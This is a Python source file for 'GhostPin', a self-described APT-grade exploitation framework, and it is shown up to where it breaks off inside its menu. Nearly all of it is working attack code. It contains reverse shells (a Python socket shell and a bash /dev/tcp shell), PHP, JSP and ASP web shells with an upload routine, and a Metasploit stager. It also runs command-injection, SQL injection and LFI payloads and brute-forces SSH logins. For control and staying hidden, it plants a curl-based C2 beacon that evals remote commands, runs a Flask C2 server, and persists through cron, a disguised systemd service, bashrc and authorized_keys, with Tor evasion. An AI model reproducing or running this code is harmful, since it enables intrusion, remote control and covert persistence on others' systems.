#!/usr/bin/env python3
#===============================================================================
# GhostPin v12.0 - Ultimate APT-Grade Exploitation Framework
# Professional Red Team Operations - Complete Attack Chain
# Author: F1REW0LF
# License: MIT - For authorized security testing only
# Version: 12.0.0
#===============================================================================

import sys
import os
import re
import json
import time
import random
import base64
import hashlib
import socket
import threading
import signal
import ssl
import subprocess
import argparse
import urllib.parse
import asyncio
import platform
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Set, Union
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import secrets
import tempfile
import shutil
import logging
from abc import ABC, abstractmethod

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import dns.resolver
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import socks
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

VERSION = "12.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

#===============================================================================
# COLORS
#===============================================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ORANGE = '\033[38;5;208m'
    DARK_RED = '\033[31m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ██████╗  ██╗  ██╗  ██████╗  ███████╗████████╗██████╗  ██╗███╗   ██╗
    ██╔════╝  ██║  ██║ ██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║       ███████║ ██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║       ██╔══██║ ██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗  ██║  ██║ ╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝  ╚═╝  ╚═╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{Colors.WHITE}
{Colors.RED}{Colors.BOLD}    ULTIMATE APT-GRADE EXPLOITATION FRAMEWORK v{VERSION}{Colors.WHITE}
{Colors.YELLOW}    Professional Red Team Operations | Complete Attack Chain{Colors.WHITE}
{Colors.PURPLE}    Author: {AUTHOR} | License: {LICENSE}{Colors.WHITE}
{Colors.DIM}    [+] Zero Trace | Multi-Vector | Full Spectrum Attack{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

#===============================================================================
# UTILITY FUNCTIONS
#===============================================================================

def random_string(length: int = 8) -> str:
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

def random_ip() -> str:
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def generate_fingerprint() -> str:
    return hashlib.sha256(f"{time.time()}{random.randint(1,999999)}{random_string(16)}".encode()).hexdigest()[:16]

def jitter_delay(base: float = 1.0) -> float:
    return base * (1 + random.uniform(-0.3, 0.3))

#===============================================================================
# STEALTH ENGINE
#===============================================================================

class StealthEngine:
    """Advanced stealth engine for APT operations"""
    
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.proxies = self._load_proxies()
        self.tor_enabled = False
        self._setup_encryption()
        self._setup_tor()
    
    def _setup_encryption(self):
        if CRYPTO_AVAILABLE:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000
            )
            key = base64.urlsafe_b64encode(kdf.derive(b"ghostpin_master_key"))
            self.cipher = Fernet(key)
    
    def _setup_tor(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect(("127.0.0.1", 9050))
                self.tor_enabled = True
        except:
            pass
    
    def _load_user_agents(self) -> List[str]:
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15'
        ]
    
    def _load_proxies(self) -> List[str]:
        proxies = []
        proxy_files = ['proxies.txt', 'socks5.txt', 'tor_proxies.txt']
        for pf in proxy_files:
            if os.path.exists(pf):
                try:
                    with open(pf, 'r') as f:
                        proxies.extend([l.strip() for l in f if l.strip()])
                except:
                    pass
        return proxies
    
    def encrypt_data(self, data: str) -> str:
        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
            return self.cipher.encrypt(data.encode()).decode()
        return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, data: str) -> str:
        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
            return self.cipher.decrypt(data.encode()).decode()
        return base64.b64decode(data).decode()
    
    def random_ua(self) -> str:
        return random.choice(self.user_agents)
    
    def random_delay(self, min_sec: float = 0.3, max_sec: float = 1.5):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def get_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        })
        session.verify = False
        
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504, 429])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        if self.tor_enabled:
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        elif self.proxies:
            proxy = random.choice(self.proxies)
            session.proxies = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        
        return session

#===============================================================================
# DATA CLASSES
#===============================================================================

@dataclass
class APTTarget:
    target: str
    ip_addresses: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, Dict] = field(default_factory=dict)
    vulnerabilities: List[Dict] = field(default_factory=list)
    web_applications: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    attack_vectors: List[Dict] = field(default_factory=list)
    persistence: List[Dict] = field(default_factory=list)
    exfiltrated_data: List[Dict] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ExploitResult:
    target: str
    success: bool
    method: str
    severity: str
    data: Any
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

#===============================================================================
= EXPLOIT PAYLOAD GENERATOR
#===============================================================================

class ExploitPayloadGenerator:
    """Advanced payload generation for exploitation"""
    
    def __init__(self):
        self.payloads = self._generate_payloads()
    
    def _generate_payloads(self) -> Dict:
        return {
            'reverse_shell_python': self._reverse_shell_python,
            'reverse_shell_bash': self._reverse_shell_bash,
            'webshell_php': self._webshell_php,
            'webshell_jsp': self._webshell_jsp,
            'webshell_asp': self._webshell_asp,
            'meterpreter_stager': self._meterpreter_stager,
            'c2_beacon': self._c2_beacon
        }
    
    def _reverse_shell_python(self, host: str, port: int) -> str:
        return f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    
    def _reverse_shell_bash(self, host: str, port: int) -> str:
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    
    def _webshell_php(self) -> str:
        return '''<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])){
    system($_POST['cmd']);
}
?>'''
    
    def _webshell_jsp(self) -> str:
        return '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null){
        out.println(line);
    }
}
%>'''
    
    def _webshell_asp(self) -> str:
        return '''<% 
Dim cmd 
cmd = Request("cmd")
If cmd <> "" Then
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(cmd)
    Response.Write objExec.StdOut.ReadAll()
End If
%>'''
    
    def _meterpreter_stager(self, host: str, port: int) -> str:
        return f'''use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {host}
set LPORT {port}
set ExitOnSession false
exploit -j'''
    
    def _c2_beacon(self, c2_url: str) -> str:
        return f'''#!/bin/bash
C2_URL="{c2_url}"
while true; do
    curl -s -X POST "$C2_URL/beacon" -H "Content-Type: application/json" -d '{{"host":"$(hostname)","user":"$(whoami)"}}'
    RESPONSE=$(curl -s -X GET "$C2_URL/command")
    if [ -n "$RESPONSE" ]; then
        eval "$RESPONSE"
        curl -s -X POST "$C2_URL/result" -d '{{"result":"$RESPONSE"}}'
    fi
    sleep 60
done'''
    
    def generate(self, payload_type: str, host: str = "127.0.0.1", port: int = 4444) -> Optional[str]:
        if payload_type in self.payloads:
            return self.payloads[payload_type](host, port) if host else self.payloads[payload_type]()
        return None

#===============================================================================
# REAL EXPLOITATION ENGINE
#===============================================================================

class RealExploitationEngine:
    """Real exploitation with actual attack execution"""
    
    def __init__(self, target: APTTarget):
        self.target = target
        self.stealth = StealthEngine()
        self.session = self.stealth.get_session()
        self.payload_gen = ExploitPayloadGenerator()
        self.results: List[ExploitResult] = []
        self.webshells: List[str] = []
    
    def exploit_rce(self, url: str, param: str = 'cmd', cmd: str = "id") -> ExploitResult:
        """Remote Code Execution exploitation"""
        cprint(f"[RCE] Exploiting {url}", Colors.RED)
        
        payloads = [
            f'; {cmd}',
            f'| {cmd}',
            f'|| {cmd}',
            f'&& {cmd}',
            f'& {cmd}',
            f'`{cmd}`',
            f'$({cmd})',
            f'$(echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | bash)'
        ]
        
        for payload in payloads:
            try:
                self.stealth.random_delay(0.5, 1.0)
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    output_lower = response.text.lower()
                    if 'uid=' in output_lower or 'id=' in output_lower or 'root' in output_lower:
                        return ExploitResult(
                            target=url,
                            success=True,
                            method='RCE',
                            severity='CRITICAL',
                            data={'payload': payload, 'output': response.text[:500]}
                        )
            except:
                pass
        
        return ExploitResult(
            target=url,
            success=False,
            method='RCE',
            severity='HIGH',
            data='No exploitable RCE found'
        )
    
    def exploit_sqli(self, url: str, param: str = 'id') -> ExploitResult:
        """SQL Injection exploitation"""
        cprint(f"[SQLi] Exploiting {url}", Colors.RED)
        
        payloads = [
            f"' UNION SELECT table_name, NULL FROM information_schema.tables--",
            f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
            f"' UNION SELECT username, password FROM users--",
            f"' AND SLEEP(5)--"
        ]
        
        for payload in payloads:
            try:
                self.stealth.random_delay(0.5, 1.0)
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    sql_errors = ['SQL', 'MySQL', 'Syntax error', 'mysql_fetch_']
                    for error in sql_errors:
                        if error in response.text:
                            return ExploitResult(
                                target=url,
                                success=True,
                                method='SQL Injection',
                                severity='CRITICAL',
                                data={'payload': payload, 'response': response.text[:500]}
                            )
            except:
                pass
        
        return ExploitResult(
            target=url,
            success=False,
            method='SQL Injection',
            severity='HIGH',
            data='No exploitable SQLi found'
        )
    
    def exploit_lfi(self, url: str, param: str = 'file') -> ExploitResult:
        """Local File Inclusion exploitation"""
        cprint(f"[LFI] Exploiting {url}", Colors.RED)
        
        files = ['/etc/passwd', '/etc/hosts', '/proc/self/environ', '/var/log/apache2/access.log']
        payloads = [
            '../../../../{}',
            '../../../{}',
            '../../{}',
            '....//....//....//{}'
        ]
        
        for file_path in files:
            for payload_template in payloads:
                try:
                    self.stealth.random_delay(0.5, 1.0)
                    payload = payload_template.format(file_path)
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        if 'root:' in response.text or 'bin:' in response.text:
                            return ExploitResult(
                                target=url,
                                success=True,
                                method='LFI',
                                severity='HIGH',
                                data={'file': file_path, 'content': response.text[:500]}
                            )
                except:
                    pass
        
        return ExploitResult(
            target=url,
            success=False,
            method='LFI',
            severity='MEDIUM',
            data='No exploitable LFI found'
        )
    
    def exploit_upload(self, target: str, port: int = 80) -> ExploitResult:
        """File upload exploitation"""
        cprint(f"[UPLOAD] Uploading to {target}:{port}", Colors.PURPLE)
        
        upload_paths = [
            '/upload', '/uploads', '/file', '/files', '/media',
            '/image', '/api/upload', '/admin/upload', '/wp-admin/admin-ajax.php'
        ]
        
        shell_code = self.payload_gen.generate('webshell_php')
        
        protocol = 'https' if port in [443, 8443] else 'http'
        base_url = f"{protocol}://{target}:{port}"
        
        for upload_path in upload_paths:
            try:
                self.stealth.random_delay(0.5, 1.0)
                url = f"{base_url}{upload_path}"
                files = {'file': (f'shell_{random_string(6)}.php', shell_code, 'application/x-php')}
                response = self.session.post(url, files=files, timeout=10)
                
                if response.status_code in [200, 201, 202, 302]:
                    for ext in ['php', 'php5', 'phtml']:
                        test_url = f"{base_url}/shell_{random_string(6)}.{ext}"
                        resp = self.session.get(test_url, timeout=5)
                        if resp.status_code == 200:
                            self.webshells.append(test_url)
                            return ExploitResult(
                                target=target,
                                success=True,
                                method='File Upload',
                                severity='CRITICAL',
                                data={'url': test_url, 'type': ext}
                            )
            except:
                pass
        
        return ExploitResult(
            target=target,
            success=False,
            method='File Upload',
            severity='MEDIUM',
            data='No upload vulnerability found'
        )
    
    def exploit_ssh_bruteforce(self, target: str, username: str, wordlist: List[str]) -> ExploitResult:
        """SSH Bruteforce exploitation"""
        cprint(f"[SSH] Bruteforcing {target}", Colors.RED)
        
        if not PARAMIKO_AVAILABLE:
            return ExploitResult(
                target=target,
                success=False,
                method='SSH Bruteforce',
                severity='LOW',
                data='Paramiko not available'
            )
        
        for password in wordlist[:50]:
            try:
                self.stealth.random_delay(1.0, 2.0)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password, timeout=5)
                ssh.close()
                
                return ExploitResult(
                    target=target,
                    success=True,
                    method='SSH Bruteforce',
                    severity='CRITICAL',
                    data={'username': username, 'password': password}
                )
            except:
                pass
        
        return ExploitResult(
            target=target,
            success=False,
            method='SSH Bruteforce',
            severity='MEDIUM',
            data='No credentials found'
        )
    
    def deploy_webshell(self, target: str, port: int = 80) -> ExploitResult:
        """Deploy webshell via upload"""
        return self.exploit_upload(target, port)
    
    def execute_attack_chain(self, vectors: List[Dict]) -> List[ExploitResult]:
        """Execute multiple attack vectors"""
        results = []
        
        for vector in vectors:
            method = vector.get('method', '').lower()
            url = vector.get('url', f"http://{self.target.target}")
            param = vector.get('param', 'id')
            
            if method == 'rce':
                result = self.exploit_rce(url, param)
            elif method == 'sqli':
                result = self.exploit_sqli(url, param)
            elif method == 'lfi':
                result = self.exploit_lfi(url, param)
            elif method == 'upload':
                result = self.deploy_webshell(self.target.target, 80)
            else:
                continue
            
            results.append(result)
            self.results.append(result)
            
            if result.success:
                cprint(f"[+] {method.upper()} successful!", Colors.GREEN)
            else:
                cprint(f"[-] {method.upper()} failed", Colors.RED)
        
        return results

#===============================================================================
# PERSISTENCE ENGINE
#===============================================================================

class PersistenceEngine:
    """Advanced persistence deployment"""
    
    def __init__(self, c2_server: Optional[Any] = None):
        self.c2_server = c2_server
        self.stealth = StealthEngine()
        self.deployed = []
    
    def deploy_linux(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Deploy Linux persistence"""
        cprint("[PERSIST] Deploying Linux persistence", Colors.PURPLE)
        
        result = {'success': False, 'methods': [], 'target': target}
        
        if not PARAMIKO_AVAILABLE:
            cprint("[-] Paramiko not available", Colors.RED)
            return result
        
        methods = [
            self._cron_persistence,
            self._systemd_persistence,
            self._bashrc_persistence,
            self._ssh_key_persistence,
            self._c2_beacon_persistence
        ]
        
        for method in methods:
            try:
                method_result = method(target, username, password, payload)
                if method_result.get('success'):
                    result['methods'].append(method_result['technique'])
                    result['success'] = True
                    cprint(f"[+] {method_result['technique']} deployed", Colors.GREEN)
            except Exception as e:
                cprint(f"[-] {method.__name__} failed: {e}", Colors.RED)
        
        if result['success']:
            self.deployed.append(result)
        
        return result
    
    def _cron_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Cron job persistence"""
        result = {'success': False, 'technique': 'cron'}
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=10)
        
        crons = [
            f"* * * * * {payload}",
            f"*/5 * * * * {payload}",
            f"@reboot {payload}"
        ]
        
        for cron in crons:
            ssh.exec_command(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
        
        ssh.close()
        result['success'] = True
        return result
    
    def _systemd_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Systemd service persistence"""
        result = {'success': False, 'technique': 'systemd'}
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=10)
        
        service_name = f"system-update-{random.randint(1000, 9999)}"
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target"""
        
        ssh.exec_command(f'echo "{service_content}" > /etc/systemd/system/{service_name}.service')
        ssh.exec_command(f'systemctl daemon-reload')
        ssh.exec_command(f'systemctl enable {service_name}.service')
        ssh.exec_command(f'systemctl start {service_name}.service')
        ssh.close()
        
        result['success'] = True
        result['service'] = service_name
        return result
    
    def _bashrc_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Bashrc persistence"""
        result = {'success': False, 'technique': 'bashrc'}
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=10)
        
        for rc_file in ['~/.bashrc', '~/.bash_profile', '~/.profile']:
            ssh.exec_command(f'echo "{payload}" >> {rc_file}')
        
        ssh.close()
        result['success'] = True
        return result
    
    def _ssh_key_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
        """SSH key persistence"""
        result = {'success': False, 'technique': 'ssh_key'}
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=10)
        
        key = paramiko.RSAKey.generate(2048)
        pub_key = f"ssh-rsa {key.get_base64()} {username}@{target}"
        
        ssh.exec_command('mkdir -p ~/.ssh')
        ssh.exec_command(f'echo "{pub_key}" >> ~/.ssh/authorized_keys')
        ssh.exec_command('chmod 600 ~/.ssh/authorized_keys')
        ssh.exec_command('chmod 700 ~/.ssh')
        ssh.close()
        
        result['success'] = True
        result['public_key'] = pub_key
        return result
    
    def _c2_beacon_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
        """C2 beacon persistence"""
        result = {'success': False, 'technique': 'c2_beacon'}
        
        if not self.c2_server:
            return result
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=10)
        
        c2_url = f"http://{self.c2_server.host}:{self.c2_server.port}"
        beacon_script = f'''#!/bin/bash
C2_URL="{c2_url}"
while true; do
    curl -s -X POST "$C2_URL/beacon" -H "Content-Type: application/json" -d '{{"host":"$(hostname)","user":"$(whoami)"}}'
    sleep 60
done'''
        
        ssh.exec_command(f'echo "{beacon_script}" > /usr/local/bin/c2_beacon.sh')
        ssh.exec_command('chmod +x /usr/local/bin/c2_beacon.sh')
        ssh.exec_command('(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/c2_beacon.sh") | crontab -')
        ssh.close()
        
        result['success'] = True
        return result

#===============================================================================
# C2 SERVER
#===============================================================================

class C2Server:
    """Complete C2 server with command and control"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.beacons = []
        self.commands = {}
        self.results = {}
        self.running = False
        self.server_thread = None
        self.app = None
    
    def start(self) -> bool:
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not installed", Colors.RED)
            return False
        
        cprint("[C2] Starting C2 server...", Colors.GREEN)
        self.running = True
        
        app = Flask(__name__)
        self.app = app
        
        @app.route('/beacon', methods=['POST'])
        def beacon():
            try:
                data = request.get_json()
                if data:
                    beacon_data = {
                        'host': data.get('host', 'unknown'),
                        'user': data.get('user', 'unknown'),
                        'timestamp': datetime.now().isoformat(),
                        'ip': request.remote_addr
                    }
                    self.beacons.append(beacon_data)
                    cprint(f"[C2] Beacon from {beacon_data['host']}", Colors.GREEN)
                    
                    if data.get('host') in self.commands:
                        cmd = self.commands[data['host']].pop(0)
                        return jsonify({'command': cmd})
                    
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/command', methods=['POST'])
        def send_command():
            try:
                data = request.get_json()
                host = data.get('host')
                command = data.get('command')
                if host and command:
                    if host not in self.commands:
                        self.commands[host] = []
                    self.commands[host].append(command)
                    cprint(f"[C2] Command sent to {host}: {command}", Colors.BLUE)
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/result', methods=['POST'])
        def receive_result():
            try:
                data = request.get_json()
                if data:
                    host = data.get('host')
                    result = data.get('result')
                    if host not in self.results:
                        self.results[host] = []
                    self.results[host].append({
                        'timestamp': datetime.now().isoformat(),
                        'result': result
                    })
                    cprint(f"[C2] Result from {host}", Colors.GREEN)
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/beacons', methods=['GET'])
        def get_beacons():
            return jsonify(self.beacons[-100:])
        
        @app.route('/stats', methods=['GET'])
        def get_stats():
            return jsonify({
                'beacons': len(self.beacons),
                'hosts': len(set(b.get('host') for b in self.beacons)),
                'commands': sum(len(cmds) for cmds in self.commands.values()),
                'results': sum(len(rs) for rs in self.results.values())
            })
        
        def run_server():
            app.run(host=self.host, port=self.port, debug=False, threaded=True, use_reloader=False)
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        time.sleep(1)
        
        cprint(f"[C2] Server listening on {self.host}:{self.port}", Colors.GREEN)
        return True
    
    def stop(self):
        self.running = False
        if self.server_thread:
            self.server_thread.join(timeout=5)
        cprint("[C2] Server stopped", Colors.RED)

#===============================================================================
= APT RECONNAISSANCE
#===============================================================================

class APTReconnaissance:
    """Advanced APT reconnaissance"""
    
    def __init__(self, target: str):
        self.target = target
        self.stealth = StealthEngine()
        self.session = self.stealth.get_session()
        self.profile = APTTarget(target=target)
    
    def full_recon(self) -> APTTarget:
        cprint(f"[RECON] Scanning {self.target}", Colors.BLUE)
        
        self._resolve_dns()
        self._discover_subdomains()
        self._port_scan()
        self._detect_services()
        self._web_recon()
        self._find_vulnerabilities()
        
        return self.profile
    
    def _resolve_dns(self):
        try:
            ip = socket.gethostbyname(self.target)
            self.profile.ip_addresses.append(ip)
            cprint(f"[+] IP: {ip}", Colors.GREEN)
        except:
            pass
    
    def _discover_subdomains(self):
        common = ['www', 'mail', 'admin', 'api', 'dev', 'test', 'staging', 'prod', 'app']
        for sub in common:
            try:
                full = f"{sub}.{self.target}"
                ip = socket.gethostbyname(full)
                self.profile.subdomains.append(full)
                cprint(f"[+] Subdomain: {full} ({ip})", Colors.DIM)
            except:
                pass
    
    def _port_scan(self):
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
        
        for ip in self.profile.ip_addresses:
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    if result == 0:
                        self.profile.open_ports.append(port)
                        cprint(f"[+] Port {port} open", Colors.GREEN)
                except:
                    pass
    
    def _detect_services(self):
        for port in self.profile.open_ports[:5]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.profile.ip_addresses[0], port))
                banner = sock.recv(1024).decode('utf-8', errors='ignore')[:100]
                sock.close()
                
                service = {'name': 'unknown', 'banner': banner}
                if port == 22:
                    service['name'] = 'SSH'
                elif port == 80 or port == 8080:
                    service['name'] = 'HTTP'
                elif port == 443 or port == 8443:
                    service['name'] = 'HTTPS'
                elif port == 3306:
                    service['name'] = 'MySQL'
                elif port == 5432:
                    service['name'] = 'PostgreSQL'
                elif port == 6379:
                    service['name'] = 'Redis'
                elif port == 3389:
                    service['name'] = 'RDP'
                
                self.profile.services[port] = service
                cprint(f"[+] Service on {port}: {service['name']}", Colors.DIM)
            except:
                pass
    
    def _web_recon(self):
        for port in self.profile.open_ports:
            if port in [80, 443, 8080, 8443]:
                try:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{self.target}:{port}"
                    response = self.session.get(url, timeout=5)
                    
                    web_app = {
                        'url': url,
                        'server': response.headers.get('Server', 'unknown'),
                        'status': response.status_code,
                        'title': self._extract_title(response.text)
                    }
                    self.profile.web_applications.append(web_app)
                    cprint(f"[+] Web app: {url} - {web_app['server']}", Colors.GREEN)
                except:
                    pass
    
    def _extract_title(self, html: str) -> str:
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1).strip() if match else 'Untitled'
    
    def _find_vulnerabilities(self):
        for app in self.profile.web_applications:
            url = app['url']
            # Check for common vulnerabilities
            test_payloads = {
                'XSS': '<script>alert(1)</script>',
                'SQLi': "' OR '1'='1",
                'LFI': '../../../../etc/passwd'
            }
            
            for vuln_type, payload in test_payloads.items():
                try:
                    test_url = f"{url}?q={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if vuln_type == 'XSS' and payload in response.text:
                        self.profile.vulnerabilities.append({
                            'type': 'XSS',
                            'url': test_url,
                            'severity': 'HIGH'
                        })
                    elif vuln_type == 'SQLi' and ('SQL' in response.text or 'mysql' in response.text.lower()):
                        self.profile.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'severity': 'CRITICAL'
                        })
                    elif vuln_type == 'LFI' and 'root:' in response.text:
                        self.profile.vulnerabilities.append({
                            'type': 'LFI',
                            'url': test_url,
                            'severity': 'HIGH'
                        })
                except:
                    pass

#===============================================================================
# MAIN FRAMEWORK
#===============================================================================

class GhostPinUltimate:
    """Ultimate GhostPin APT Framework"""
    
    def __init__(self):
        self.stealth = StealthEngine()
        self.c2_server = C2Server()
        self.payload_gen = ExploitPayloadGenerator()
        self.current_target = None
        self.current_profile = None
        self.results = []
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down GhostPin...", Colors.RED)
        self.running = False
        if self.c2_server:
            self.c2_server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.BOLD}{Colors.PURPLE}GhostPin v{VERSION} - Ultimate APT Exploitation Framework{Colors.WHITE}
{Colors.RED}{Colors.BOLD}APT Grade | Zero Trace | Full Spectrum Attack{Colors.WHITE}
{Colors.CYAN}Reconnaissance | Exploitation | Persistence | C2{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.GREEN}[1]  APT Reconnaissance
{Colors.GREEN}[2]  RCE Exploitation
{Colors.GREEN}[3]  SQL Injection Exploitation
{Colors.GREEN}[4]  LFI Exploitation
{Colors.GREEN}[5]  File Upload / Webshell
{Colors.GREEN}[6]  SSH Bruteforce
{Colors.GREEN}[7]  Deploy Persistence
